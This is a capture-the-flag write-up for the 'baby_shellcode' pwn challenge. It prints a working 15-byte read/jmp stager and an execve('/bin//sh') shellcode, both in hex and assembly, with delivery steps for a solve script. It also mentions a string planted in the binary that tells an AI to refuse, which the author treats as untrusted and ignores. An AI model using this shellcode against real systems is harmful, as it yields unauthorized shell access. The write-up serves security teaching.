# baby_shellcode — THEM2026 (pwn)

## TL;DR
A `read()` into an `mmap`'d RWX page lets us run shellcode, but only **15 bytes**
are read before the page is called. 15 bytes is too small for a full
`execve("/bin/sh")`. The trick is a **two-stage stager**: the 15-byte stage-1
re-invokes `read()` to pull in a larger stage-2 (the real `execve` shellcode)
into the same page, then jumps to it.

---

## Binary

```
baby_shellcode: ELF 64-bit LSB pie executable, x86-64, dynamically linked,
                interpreter /lib64/ld-linux-x86-64.so.2, not stripped
```

Mitigations: PIE + BIND_NOW (Full RELRO). NX is irrelevant here because the
attacker page is mapped RWX.

### Note on the embedded "anti-AI" string
`strings` reveals a planted message telling any AI to refuse the challenge.
That's untrusted text inside the target binary, not a competition rule, and it
carries no authority — it's ignored.

---

## Source-level behavior (from disassembly)

`main`:

```
mmap(NULL, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, -1, 0)
  -> rax = page (saved at [rbp-0x10])
read(0, page, 0xf)          ; only 15 bytes!
rdx = page                  ; [rbp-0x8] = page  (leftover, matters later)
rdi = page
call rdx                    ; jump into our 15 bytes
```

Key facts the exploit relies on:

- The page is **RWX** — we can both write more code into it and execute it.
- On entry to our shellcode, registers are conveniently set:
  - `rax` = page (return value of last syscall/read isn't guaranteed, but...)
  - `rdi` = page  (set right before `call rdx`)
  - `rsi` = page  (`rsi` was set to `page` for the `read` call and not clobbered)
  - `rdx` = page  (`[rbp-0x8]` copied into rdx before the call)
- Only **15 bytes** are available. Min execve shellcode is ~21–26 bytes, so a
  single-stage solve doesn't fit. We need a stager.

---

## Stage 1 — the 15-byte stager

```
hex: 48 8d 76 0f  31 ff  6a 7f  5a  31 c0  0f 05  ff e6   (exactly 15 bytes)
```

Disassembly:

```asm
lea  rsi, [rsi + 0xf]   ; rsi = page + 15  -> read past our own code
xor  edi, edi           ; rdi = 0  (fd = stdin)
push 0x7f ; pop rdx      ; rdx = 0x7f = 127  (count)
xor  eax, eax            ; rax = 0  -> SYS_read
syscall                  ; read(0, page+15, 0x7f)
jmp  rsi                 ; jump to page+15 = freshly-read stage 2
```

Why each piece matters:

- **`lea rsi,[rsi+0xf]`** — `rsi` already holds the page base, so `+0xf` points
  to the byte right after our 15-byte stub. The second `read` lands stage-2
  there, so it does **not** overwrite the instruction currently executing
  (`jmp rsi`/`syscall`). This is the subtle part: read into `page+15`, not
  `page`, or you corrupt the running code.
- **`xor edi,edi`** — fd 0 (stdin).
- **`push 0x7f; pop rdx`** — sets count to 127 in 3 bytes (cheaper than
  `mov edx, 0x7f`).
- **`xor eax,eax; syscall`** — `SYS_read = 0`.
- **`jmp rsi`** — `rsi` = `page+15`, the destination of the read. Jump there.

Total: 15 bytes exactly, fitting the `read(0, page, 0xf)` limit.

---

## Stage 2 — execve("/bin//sh", 0, 0)

Sent as the second write; lands at `page+15` and is jumped to.

```
hex: 48 31 f6  48 31 d2  56  48 bf 2f 62 69 6e 2f 2f 73 68  57  54  5f  6a 3b  58  99  0f 05
```

Disassembly:

```asm
xor  rsi, rsi               ; argv = NULL
xor  rdx, rdx               ; envp = NULL  (must clear; it inherited 'page')
push rsi                    ; null terminator on stack
movabs rdi, 0x68732f2f6e69622f  ; "/bin//sh"
push rdi
push rsp ; pop rdi          ; rdi -> "/bin//sh"
push 0x3b ; pop rax          ; rax = 59 = SYS_execve
cdq                          ; rdx = 0 (sign-extend eax; eax>0 so rdx=0)
syscall                     ; execve("/bin//sh", NULL, NULL)
```

`"/bin//sh"` (8 bytes) is the classic null-free path string; the extra `/` keeps
it 8 bytes wide for a single `movabs`.

---

## Delivery / exploit driver

`distribution/solve.py`:

1. Connect, read the banner.
2. Send the 15-byte **stage 1**.
3. Send **stage 2** (+ newline) — this satisfies the `read(0, page+15, 0x7f)`
   issued by stage 1.
4. Drop into an interactive `select()` loop and run
   `cat flag* /flag*; id; uname -a`.

The two `sendall` calls are separated by a short `time.sleep(0.1)` so the kernel
delivers them as two distinct `read()`s rather than coalescing into one.

Run:

```
python3 distribution/solve.py <HOST> <PORT>
```

---

## Why the naive single-stage fails
- `execve("/bin/sh")` shellcode is ~21–26 bytes; the program only `read`s 15.
- So you must spend the 15 bytes bootstrapping a *bigger* read. The minimal
  re-`read` + `jmp` stager above is the intended solution — hence
  "baby_shellcode" / "what can you do with 15 bytes?"

## Key takeaways
- RWX `mmap` page + a re-entrant `read` syscall = arbitrary-length staging from
  a tiny first stage.
- Read your second stage to `page+len(stage1)` so you never clobber the
  instruction stream you're currently executing.
- Mind inherited register state: `rdx` carried the page address, so stage 2
  explicitly zeroes it before `execve` (otherwise `envp` is garbage).
